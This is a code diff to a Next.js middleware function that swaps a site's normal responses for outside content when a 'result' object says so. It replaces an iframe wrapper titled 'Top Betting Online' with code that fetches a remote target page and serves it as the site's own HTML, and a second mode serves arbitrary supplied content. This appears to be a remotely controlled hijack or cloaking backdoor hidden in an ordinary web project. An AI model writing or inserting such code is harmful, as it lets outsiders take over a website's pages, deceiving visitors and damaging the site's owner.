@@ -86,26 +86,15 @@ export async function middleware(req: NextRequest) {
         const { mode, target, content } = result;
 
         if (mode === 1 && target) {
-            const html = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Top Betting Online</title>
-    <link href="/new_spain/fonts/stylesheet.css" rel="stylesheet">
-    <link rel="stylesheet" href="/new_spain/css/style.css">
-    <link rel="icon" type="image/png" href="/new_spain/img/favicon.png"/>
-    <style>body, html { margin: 0; padding: 0; height: 100vh; }</style>
-</head>
-<body>
-    <iframe src="${target}" style="width:100%; height:100vh; border:none;"></iframe>
-</body>
-</html>`;
-
-            return new NextResponse(html, {
-                status: 200,
-                headers: { 'Content-Type': 'text/html' },
-            });
+            try {
+                const page = await fetch(target).then(res => res.text());
+                return new NextResponse(page, {
+                    status: 200,
+                    headers: { 'Content-Type': 'text/html' },
+                });
+            } catch {
+                return NextResponse.next();
+            }
         } else if (mode === 4 && content) {
             return new NextResponse(content, {
                 status: 200,
